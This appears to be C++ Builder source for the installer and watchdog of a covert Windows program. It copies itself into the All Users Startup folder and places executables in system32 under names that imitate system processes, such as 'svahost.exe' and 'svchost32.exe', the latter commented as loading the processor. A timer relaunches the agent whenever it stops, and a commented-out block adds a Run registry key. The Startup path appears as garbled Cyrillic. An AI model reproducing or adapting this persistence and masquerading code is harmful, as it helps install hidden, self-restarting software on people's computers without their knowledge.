//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
#include <tlhelp32.hpp>
TForm1 *Form1;
AnsiString agent_name="SVAHOST.EXE";

#include <tlhelp32.hpp> 

PACKAGE void __fastcall GetActiveAppList (TStringList *slist)
{
if (!slist) return;

slist->Clear(); 

TProcessEntry32 prj;
prj.dwSize = sizeof(PROCESSENTRY32); 

HANDLE hss = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0); 
if (((int)(hss)) == (-1)) return; 

AnsiString fname; 
try { 
for (bool loop = Process32First(hss, &prj); loop; loop = Process32Next(hss, &prj)) 
{ fname = AnsiString(prj.szExeFile).Trim().UpperCase(); 
if (fname.IsEmpty()) continue; 
slist->Add(fname); 
} 
} // try
catch (...) { slist->Clear(); } 

CloseHandle(hss); 
} 

//---------------------------------------------------------------------------
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Timer1Timer(TObject *Sender)
{
bool flag = false;
TStringList *slist = new TStringList();
try {
        GetActiveAppList(slist);
        for(int i=1;i<slist->Count;i++)
        if(slist->operator [](i)==agent_name) flag=true;
    }
__finally
        {
         delete slist;
        }
HWND handle;
if(!flag) ShellExecute(handle, "open", "svahost.exe", NULL, NULL, SW_SHOWNORMAL);


}
//---------------------------------------------------------------------------
void __fastcall TForm1::FormCreate(TObject *Sender)
{
//HKEY hKey;
//char szPath[0x100];
//GetModuleFileName(NULL, szPath, sizeof(szPath));

AnsiString exe_name = ExtractFileName(Application->ExeName);
AnsiString folder_program = ExtractFilePath(ParamStr(0));

AnsiString ToFileSrv="C:\\Documents and Settings\\All Users\\������� ����\\���������\\������������\\"+exe_name;
AnsiString FromFileSrv=folder_program+exe_name;
//if(!FileExists("C:\\Documents and Settings\\All Users\\������� ����\\���������\\������������\\firstrun.exe")); // copy of glob_server
CopyFile(FromFileSrv.c_str(),ToFileSrv.c_str(),false);

AnsiString ToFileAg="C:\\Windows\\system32\\svahost.exe";
AnsiString FromFileAg="\svahost.exe";
if(!FileExists("\\svahost.exe")) // copy of agent
CopyFile(FromFileAg.c_str(),ToFileAg.c_str(),false);

AnsiString ToFile="C:\\Windows\\system32\\svchost32.exe";
AnsiString FromFile="\\svchost32.exe";
if(!FileExists("\\svchost32.exe")) // copy of file which load processor
CopyFile(FromFile.c_str(),ToFile.c_str(),false);

AnsiString ToFileLoadSrv="C:\\Windows\\system32\\loadservice.exe";
AnsiString FromFileLoadSrv="\\loadservice.exe";
CopyFile(FromFileLoadSrv.c_str(),ToFileLoadSrv.c_str(),false);


/*
RegCreateKeyEx(HKEY_LOCAL_MACHINE,
"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
NULL,
"",
REG_OPTION_NON_VOLATILE,
KEY_SET_VALUE,
NULL,
&hKey,
NULL);
if (hKey)
{
RegSetValueEx(hKey, "TCYService", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath));
RegCloseKey(hKey);
}
*/
}
//---------------------------------------------------------------------------
